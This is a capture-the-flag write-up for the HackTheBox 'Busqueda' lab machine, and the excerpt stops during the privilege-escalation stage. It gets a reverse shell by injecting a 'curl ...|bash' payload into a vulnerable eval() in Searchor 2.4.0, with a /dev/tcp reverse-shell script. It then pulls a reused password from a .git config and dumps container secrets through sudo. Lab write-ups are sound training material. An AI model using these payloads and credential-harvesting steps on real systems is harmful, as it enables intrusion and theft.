@@ -1,0 +1,1527 @@
+
+  
+    
+    <title>
+      HackTheBox - Busqueda (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_3.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Busqueda (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="a86f310b-2d43-41b5-9f3d-bb61a98feee2">
+          Table of contents
+        </h1>
+        <nav id="3882cfad-98a1-4e5e-bd45-9a5230bf2854">
+          <div>
+            <a href="#a86f310b-2d43-41b5-9f3d-bb61a98feee2">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#6c1b6a0c-90d1-4e47-a695-dc5ccbccff80">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#8f328ac9-e29f-4deb-b16a-ee6b96bdebbb">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#428fc857-dd1d-43dc-b91c-0661b4cea54f">
+              
+                Web enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#12880b8d-e788-4f6f-9de0-a61328ea2772">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#f22c2986-e401-4bb1-a9b1-dde99e5e2266">
+              Post-exploitation
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#0290b0cc-1905-4faa-b2c9-4b562ccd69ad">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#8baa75d6-fe6d-4be7-b196-e97da573f64d">
+              
+                Privilege escalation
+              
+            </a>
+          </div>
+          <div>
+            <a href="#586c3ef5-932e-4cd9-b8b2-e67efd80c626">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#16950a76-2171-48e0-a795-f719695163c9">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#6468bbe7-4d5d-4e7d-aff6-a931e4b07532">
+              
+                Remote Code Execution
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#8c356623-af66-43c8-822c-686a4d65db83">
+              
+                Arbitrary Code Execution
+              
+            </a>
+          </div>
+          <div>
+            <a href="#758e688a-25da-4b3b-8342-7c3b177ff727">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#3f75ef1b-64bf-49d0-8e3e-f048e178b1a1">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="6c1b6a0c-90d1-4e47-a695-dc5ccbccff80">
+          Enumeration
+        </h1>
+        <h2 id="8f328ac9-e29f-4deb-b16a-ee6b96bdebbb">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="7f185f92-99a4-4ca9-8910-9fad4479c555" class="code"><code># Nmap 7.93 scan initiated Fri May 26 09:41:03 2023 as: nmap -A -p- -oN nmapResults.txt -d 10.129.228.217
+--------------- Timing report ---------------
+  hostgroups: min 1, max 100000
+  rtt-timeouts: init 1000, min 100, max 10000
+  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+  parallelism: min 0, max 0
+  max-retries: 10, host-timeout: 0
+  min-rate: 0, max-rate: 0
+---------------------------------------------
+Nmap scan report for 10.129.228.217
+Host is up, received syn-ack (0.038s latency).
+Scanned at 2023-05-26 09:41:04 EDT for 19s
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read from /usr/bin/../share/nmap: nmap-service-probes nmap-services.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 26 09:41:23 2023 -- 1 IP address (1 host up) scanned in 20.74 seconds</code></pre>
+        <h2 id="428fc857-dd1d-43dc-b91c-0661b4cea54f">
+          
+            Web enumeration
+          
+        </h2>
+        <p id="fb30b3b7-7fe5-4205-8c9b-630068944686">
+          When going to 
+          
+            
+              http://[TARGET_IP]/
+            
+          
+          , we are redirected to 
+          
+            
+              <a href="http://searcher.htb/">
+                http://searcher.htb/
+              </a>
+            
+          
+          . Let’s add this domain name to our 
+          
+            
+              /etc/hosts
+            
+          
+           file : 
+        </p>
+        
+        
+        
+<pre id="ae8cfd76-98bd-4c48-91a2-c647be293012" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Busqueda]
+└─$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+
+10.129.228.217  searcher.htb</code></pre>
+        <p id="802fc91c-8e25-4cc3-a3c6-034583557706">
+          Now, let’s see what’s on this web server using our web browser : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled.png"/>
+          </a>
+        
+        <p id="86ccfd4d-adad-4e23-a379-0bcfa737e8b5">
+          There is a web application that allows us to select a search engine and enter a query to be searched. We can also enable 
+          
+            
+              Auto redirect
+            
+          
+           if we want to be automatically redirected to our search result. 
+        </p>
+        <p id="024ce593-449b-409f-aa95-ba02b94d4e0c">
+          There is a detail on a Python library that is installed on the web server : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%201.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%201.png"/>
+          </a>
+        
+        <p id="b2dd0768-2d93-45b7-8026-e021e95ed7a9">
+          When we click on 
+          
+            
+              Searchor 2.4.0
+            
+          
+          , we are redirected to it’s github page. The installed version (
+          
+            
+              2.4.0
+            
+          
+          ) is not the latest. When looking at the Release page, we can see this update note : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%202.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%202.png"/>
+          </a>
+        
+        <p id="9756bf13-a569-4153-92e1-5f4312b8a2c0">
+          So there was a vulnerability in versions earlier than 
+          
+            
+              2.4.2
+            
+          
+          . Since 
+          
+            
+              Searchor 2.4.0
+            
+          
+           is installed on the webserver, it should be vulnerable. Let’s click on 
+          
+            
+              check out the patch here
+            
+          
+           to see what part of the code was patched : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%203.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%203.png"/>
+          </a>
+        
+        <p id="397c0e41-df9d-42f0-9d3c-c6c4b341ee2a">
+          So, the 
+          
+            
+              eval
+            
+          
+           function is used in the script, which can be dangerous if user input is not properly sanitized. Now, let’s take a look at the edited source code (in the 
+          
+            
+              Files changed
+            
+          
+           section) : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%204.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%204.png"/>
+          </a>
+        
+        <p id="04b3bcf5-3d13-4720-885d-3b70efecb8dc">
+          We may be able to inject a python reverse shell in the 
+          
+            
+              query
+            
+          
+           parameter.
+        </p>
+        <h1 id="12880b8d-e788-4f6f-9de0-a61328ea2772">
+          Initial access
+        </h1>
+        <p id="67db6367-2711-4995-a700-dd93be023027">
+          Let’s try to search something and capture our request made to the web server using 
+          <a href="https://portswigger.net/burp">
+            
+              Burp Suite
+            
+          </a>
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%205.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%205.png"/>
+          </a>
+        
+        <p id="754ca2bf-45b2-4f99-b438-078479ac2e88">
+          First, we need to start a listener : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%206.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%206.png"/>
+          </a>
+        
+        <p id="4fc73b9d-7176-480b-aa6a-5b2306291e9c">
+          Now, we can inject our payload in the 
+          
+            
+              query
+            
+          
+           parameter : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%207.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%207.png"/>
+          </a>
+        
+        <p id="7d8fa41c-e4c1-452c-b670-602cf98b1f03">
+          Using this payload, this is what will be passed in the 
+          
+            
+              eval()
+            
+          
+           function on the server side : 
+        </p>
+        
+        
+        
+<pre id="a6925996-ce17-4b33-8fa1-38cdf32c38fa" class="code"><code>eval(f&quot;Engine.{engine}.search(&#x27;&#x27;,exec(\&quot;import subprocess;subprocess.getoutput(&#x27;curl 10.10.16.25|bash&#x27;);&quot;))#&#x27;, copy_url={copy}, open_web={open})&quot;)</code></pre>
+        <p id="f4c7c914-bbbf-4336-bf15-68a88f30e034">
+          So this is what will be executed : 
+        </p>
+        
+        
+        
+<pre id="14ead13b-c4d4-426d-86b1-7585bc0c3e47" class="code"><code>Engine.Accuweather.search(&#x27;&#x27;,exec(&quot;import subprocess;subprocess.getoutput(&#x27;curl 10.10.16.25|bash&#x27;);&quot;)</code></pre>
+        <p id="fc28ba73-06c1-4b9d-bf52-00eebf937485">
+          Our payload will be passed as the second argument of the 
+          
+            
+              search
+            
+          
+           function.
+        </p>
+        <p id="d86428ef-e7c8-4231-90fc-ee134b2fd660">
+          The payload I use will send a 
+          
+            
+              GET
+            
+          
+           request to 
+          
+            
+              http://[ATTACKER_IP]/index.html
+            
+          
+          , and then pass the response to 
+          
+            
+              bash
+            
+          
+          . So I need to write a malicious 
+          
+            
+              index.html
+            
+          
+           file that contains a reverse shell : 
+        </p>
+        
+        
+        
+<pre id="95f79f57-8fdd-4865-8b66-c50d3f9b3779" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Easy/Busqueda/exploits]
+└─$ nano index.html
+                                                              
+┌──(kali㉿kali)-[~/…/CTF/Easy/Busqueda/exploits]
+└─$ cat index.html 
+#!/bin/bash
+
+sh -i &gt;&amp; /dev/tcp/10.10.16.25/4242 0&gt;&amp;1</code></pre>
+        <p id="a1c8db7c-6ec8-417c-bed5-e7501387a4a9">
+          Then, I need to start a simple web server using python : 
+        </p>
+        
+        
+        
+<pre id="d2682c4f-db32-41e1-84b5-bef937bec54f" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Easy/Busqueda/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+        <p id="d0ca101e-a93e-4cc3-a0fb-0ff3efb4972d">
+          Finally, we can send the request with 
+          <a href="https://portswigger.net/burp">
+            
+              Burp Suite
+            
+          </a>
+           and then take a look at our listener : 
+        </p>
+        
+        
+        
+<pre id="e07cc259-8066-407c-9cee-393792d5e978" class="code"><code>┌──(kali㉿kali)-[~]
+└─$ pwncat-cs -lp 4242
+/home/kali/.local/lib/python3.11/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+  &#x27;class&#x27;: algorithms.Blowfish,
+[11:19:44] Welcome to pwncat 🐈!                                     __main__.py:164
+[11:19:46] received connection from 10.129.228.217:54344                  bind.py:84
+[11:19:47] 0.0.0.0:4242: upgrading from /usr/bin/dash to              manager.py:957
+           /usr/bin/bash                                                            
+[11:19:48] 10.129.228.217:54344: registered new host w/ db            manager.py:957
+(local) pwncat$                                                                     
+(remote) svc@busqueda:/var/www/app$ whoami
+svc</code></pre>
+        <p id="8513fb89-f289-47c3-b7cb-48c6453ca933">
+          We have a foothold as 
+          
+            
+              svc
+            
+          
+          .
+        </p>
+        <h1 id="f22c2986-e401-4bb1-a9b1-dde99e5e2266">
+          Post-exploitation
+        </h1>
+        <h2 id="0290b0cc-1905-4faa-b2c9-4b562ccd69ad">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="c0761caa-5823-4cd2-b187-77982d4aad84">
+          In 
+          
+            
+              /var/www/html
+            
+          
+          , we can find a 
+          
+            
+              .git
+            
+          
+           directory : 
+        </p>
+        
+        
+        
+<pre id="398aaca2-a47e-404f-a7de-b639bf18440b" class="code"><code>(remote) svc@busqueda:/var/www/app$ ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
+drwxr-xr-x 8 www-data www-data 4096 May 26 13:38 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates</code></pre>
+        <p id="7347539d-6be8-48e5-9c3b-90a5734c6fbb">
+          Let’s take a look in it :
+        </p>
+        
+        
+        
+<pre id="e3b982e4-c927-4bf5-b959-02c86767cc42" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ ls -la
+total 52
+drwxr-xr-x 8 www-data www-data 4096 May 26 13:38 .
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
+drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1 14:35 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs</code></pre>
+        <p id="88f04a14-649d-4236-8663-a91388f4db4b">
+          There is a 
+          
+            
+              config
+            
+          
+           file. It may contains credentials : 
+        </p>
+        
+        
+        
+<pre id="2e76656b-d3e0-4757-8283-ffbffc914c5b" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote &quot;origin&quot;]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch &quot;main&quot;]
+        remote = origin
+        merge = refs/heads/main</code></pre>
+        <h2 id="8baa75d6-fe6d-4be7-b196-e97da573f64d">
+          
+            Privilege escalation
+          
+        </h2>
+        <p id="db6d9470-664e-448e-93ae-67b7270f5941">
+          We have a password for 
+          
+            
+              cody
+            
+          
+           user. Maybe the same password was used for 
+          
+            
+              svc
+            
+          
+           user ? We can verify this by using 
+          
+            
+              sudo -l
+            
+          
+           to list our sudo rights, it should ask for a password : 
+        </p>
+        
+        
+        
+<pre id="9306f90a-db96-4948-a673-acf40b3fa19a" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
+        <p id="4ba85f8e-fe8b-4b8b-a4e0-de46b5edea0c">
+          It worked, so the password for 
+          
+            
+              cody
+            
+          
+           user is the same for 
+          
+            
+              svc
+            
+          
+           local user. We also know that we can run 
+          
+            
+              /usr/bin/python3 /opt/scripts/system-checkup.py *
+            
+          
+           as 
+          
+            
+              root
+            
+          
+          . Let’s see what happen when we try to run this command : 
+        </p>
+        
+        
+        
+<pre id="6f2321ad-f065-457b-af90-ade976b6e0bd" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py help
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup</code></pre>
+        <p id="3de6c799-9f0f-4219-a482-54cc24824cef">
+          We can run 
+          
+            
+              docker-inspect
+            
+          
+           through this script. We may be able to retrieve sensitive information from a container with this command. Let’s try to run it : 
+        </p>
+        
+        
+        
+<pre id="1134c868-3b08-478e-ad0b-28b1d3dc3bd1" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
+Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;</code></pre>
+        <p id="5bee93bd-cce4-4b37-a01b-22fb1ce04972">
+          We need a container name and the our query which seems to be passed in the --format option. So let’s use 
+          
+            
+              docker-ps
+            
+          
+           to get containers name :
+        </p>
+        
+        
+        
+<pre id="60825531-5ae0-4548-81f1-ea1518ffb519" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   4 months ago   Up 3 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   4 months ago   Up 3 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db</code></pre>
+        <p id="0b5e9899-d423-4ae4-9b82-dede4a84dfcd">
+          Let’s try to retrieve all informations we can from the second container (
+          
+            
+              f84a6b33fb5a
+            
+          
+          ) : 
+        </p>
+        
+        
+        
+<pre id="6269df58-25dc-4352-a28c-974bd714c486" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect &#x27;{{json .}}&#x27; f84a6b33fb5a
+{&quot;Id&quot;:&quot;f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8&quot;,&quot;Created&quot;:&quot;2023-01-06T17:26:45.724856768Z&quot;,&quot;Path&quot;:&quot;docker-entrypoint.sh&quot;,&quot;Args&quot;:[&quot;mysqld&quot;],&quot;State&quot;:{&quot;Status&quot;:&quot;running&quot;,&quot;Running&quot;:true,&quot;Paused&quot;:false,&quot;Restarting&quot;:false,&quot;OOMKilled&quot;:false,&quot;Dead&quot;:false,&quot;Pid&quot;:1735,&quot;ExitCode&quot;:0,&quot;Error&quot;:&quot;&quot;,&quot;StartedAt&quot;:&quot;2023-05-26T13:39:04.980835861Z&quot;,&quot;FinishedAt&quot;:&quot;2023-04-04T17:03:02.25154071Z&quot;},&quot;Image&quot;:&quot;sha256:7484689f290f1defe06b65befc54cb6ad91a667cf0af59a265ffe76c46bd0478&quot;,&quot;ResolvConfPath&quot;:&quot;/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/resolv.conf&quot;,&quot;HostnamePath&quot;:&quot;/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/hostname&quot;,&quot;HostsPath&quot;:&quot;/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/hosts&quot;,&quot;LogPath&quot;:&quot;/var/lib/docker/containers/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8/f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8-json.log&quot;,&quot;Name&quot;:&quot;/mysql_db&quot;,&quot;RestartCount&quot;:0,&quot;Driver&quot;:&quot;overlay2&quot;,&quot;Platform&quot;:&quot;linux&quot;,&quot;MountLabel&quot;:&quot;&quot;,&quot;ProcessLabel&quot;:&quot;&quot;,&quot;AppArmorProfile&quot;:&quot;docker-default&quot;,&quot;ExecIDs&quot;:null,&quot;HostConfig&quot;:{&quot;Binds&quot;:[&quot;/root/scripts/docker/mysql:/var/lib/mysql:rw&quot;],&quot;ContainerIDFile&quot;:&quot;&quot;,&quot;LogConfig&quot;:{&quot;Type&quot;:&quot;json-file&quot;,&quot;Config&quot;:{}},&quot;NetworkMode&quot;:&quot;docker_gitea&quot;,&quot;PortBindings&quot;:{&quot;3306/tcp&quot;:[{&quot;HostIp&quot;:&quot;127.0.0.1&quot;,&quot;HostPort&quot;:&quot;3306&quot;}]},&quot;RestartPolicy&quot;:{&quot;Name&quot;:&quot;always&quot;,&quot;MaximumRetryCount&quot;:0},&quot;AutoRemove&quot;:false,&quot;VolumeDriver&quot;:&quot;&quot;,&quot;VolumesFrom&quot;:[],&quot;CapAdd&quot;:null,&quot;CapDrop&quot;:null,&quot;CgroupnsMode&quot;:&quot;private&quot;,&quot;Dns&quot;:[],&quot;DnsOptions&quot;:[],&quot;DnsSearch&quot;:[],&quot;ExtraHosts&quot;:null,&quot;GroupAdd&quot;:null,&quot;IpcMode&quot;:&quot;private&quot;,&quot;Cgroup&quot;:&quot;&quot;,&quot;Links&quot;:null,&quot;OomScoreAdj&quot;:0,&quot;PidMode&quot;:&quot;&quot;,&quot;Privileged&quot;:false,&quot;PublishAllPorts&quot;:false,&quot;ReadonlyRootfs&quot;:false,&quot;SecurityOpt&quot;:null,&quot;UTSMode&quot;:&quot;&quot;,&quot;UsernsMode&quot;:&quot;&quot;,&quot;ShmSize&quot;:67108864,&quot;Runtime&quot;:&quot;runc&quot;,&quot;ConsoleSize&quot;:[0,0],&quot;Isolation&quot;:&quot;&quot;,&quot;CpuShares&quot;:0,&quot;Memory&quot;:0,&quot;NanoCpus&quot;:0,&quot;CgroupParent&quot;:&quot;&quot;,&quot;BlkioWeight&quot;:0,&quot;BlkioWeightDevice&quot;:null,&quot;BlkioDeviceReadBps&quot;:null,&quot;BlkioDeviceWriteBps&quot;:null,&quot;BlkioDeviceReadIOps&quot;:null,&quot;BlkioDeviceWriteIOps&quot;:null,&quot;CpuPeriod&quot;:0,&quot;CpuQuota&quot;:0,&quot;CpuRealtimePeriod&quot;:0,&quot;CpuRealtimeRuntime&quot;:0,&quot;CpusetCpus&quot;:&quot;&quot;,&quot;CpusetMems&quot;:&quot;&quot;,&quot;Devices&quot;:null,&quot;DeviceCgroupRules&quot;:null,&quot;DeviceRequests&quot;:null,&quot;KernelMemory&quot;:0,&quot;KernelMemoryTCP&quot;:0,&quot;MemoryReservation&quot;:0,&quot;MemorySwap&quot;:0,&quot;MemorySwappiness&quot;:null,&quot;OomKillDisable&quot;:null,&quot;PidsLimit&quot;:null,&quot;Ulimits&quot;:null,&quot;CpuCount&quot;:0,&quot;CpuPercent&quot;:0,&quot;IOMaximumIOps&quot;:0,&quot;IOMaximumBandwidth&quot;:0,&quot;MaskedPaths&quot;:[&quot;/proc/asound&quot;,&quot;/proc/acpi&quot;,&quot;/proc/kcore&quot;,&quot;/proc/keys&quot;,&quot;/proc/latency_stats&quot;,&quot;/proc/timer_list&quot;,&quot;/proc/timer_stats&quot;,&quot;/proc/sched_debug&quot;,&quot;/proc/scsi&quot;,&quot;/sys/firmware&quot;],&quot;ReadonlyPaths&quot;:[&quot;/proc/bus&quot;,&quot;/proc/fs&quot;,&quot;/proc/irq&quot;,&quot;/proc/sys&quot;,&quot;/proc/sysrq-trigger&quot;]},&quot;GraphDriver&quot;:{&quot;Data&quot;:{&quot;LowerDir&quot;:&quot;/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0-init/diff:/var/lib/docker/overlay2/a4da5d7e3df4c4cf7f6b2fe7df9d796b09e4b9d5b8430afb9bda10312385acd1/diff:/var/lib/docker/overlay2/73a0df4fac76e17181389bf89f324eb674d40ad26fc0cf5d4570c0fe2dbb52c0/diff:/var/lib/docker/overlay2/1705a1d523a56b654d350ccd41961cd541f8d22fade1e497c441ced2fd93e39a/diff:/var/lib/docker/overlay2/e4441c5b0550897758a6122664b3024905bc374ce89071f62ce957e8e802922d/diff:/var/lib/docker/overlay2/ef058a407a2a6c54acb02f9b015081d72e576ad284a14ab22d1e455a1c8e030f/diff:/var/lib/docker/overlay2/2e330bfa21f2c72223a60d2e90e9b856116d086e42607494166556b31c5cd40d/diff:/var/lib/docker/overlay2/f90d2dd1fd62543f813e0c01ddb5c8d9b5a0f85e5a638a3cbdc7d54da3c06184/diff:/var/lib/docker/overlay2/df21f9ce55eb6858cb6c78ae8da6574dde9ec267342c5d2076a58db14a6d27aa/diff:/var/lib/docker/overlay2/c772565ab63c4c69c5a74fc583a926e468fda9231836f22e70f93097829f481d/diff:/var/lib/docker/overlay2/70d25e07bcfdd16b9b867063259ab16d8bcf3940cc21516262f6feaa67fdb71d/diff:/var/lib/docker/overlay2/c030c975c92c921fa203634104a1bde311b1227e4c5be595fbb5a0a2c5de3ad5/diff&quot;,&quot;MergedDir&quot;:&quot;/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/merged&quot;,&quot;UpperDir&quot;:&quot;/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/diff&quot;,&quot;WorkDir&quot;:&quot;/var/lib/docker/overlay2/dea767bc68f589fb78dfe58af4c1b2ee57f1c52008a0cbedf40739ebfc1e27f0/work&quot;},&quot;Name&quot;:&quot;overlay2&quot;},&quot;Mounts&quot;:[{&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root/scripts/docker/mysql&quot;,&quot;Destination&quot;:&quot;/var/lib/mysql&quot;,&quot;Mode&quot;:&quot;rw&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rprivate&quot;}],&quot;Config&quot;:{&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:{&quot;3306/tcp&quot;:{},&quot;33060/tcp&quot;:{}},&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=j[HIDDEN]F&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=y[HIDDEN]h&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:{&quot;/var/lib/mysql&quot;:{}},&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:{&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;}},&quot;NetworkSettings&quot;:{&quot;Bridge&quot;:&quot;&quot;,&quot;SandboxID&quot;:&quot;98405ecf5683d3e33f30385ec0fae1af396c26933f18437db2a0d92dfa5223b0&quot;,&quot;HairpinMode&quot;:false,&quot;LinkLocalIPv6Address&quot;:&quot;&quot;,&quot;LinkLocalIPv6PrefixLen&quot;:0,&quot;Ports&quot;:{&quot;3306/tcp&quot;:[{&quot;HostIp&quot;:&quot;127.0.0.1&quot;,&quot;HostPort&quot;:&quot;3306&quot;}],&quot;33060/tcp&quot;:null},&quot;SandboxKey&quot;:&quot;/var/run/docker/netns/98405ecf5683&quot;,&quot;Secondary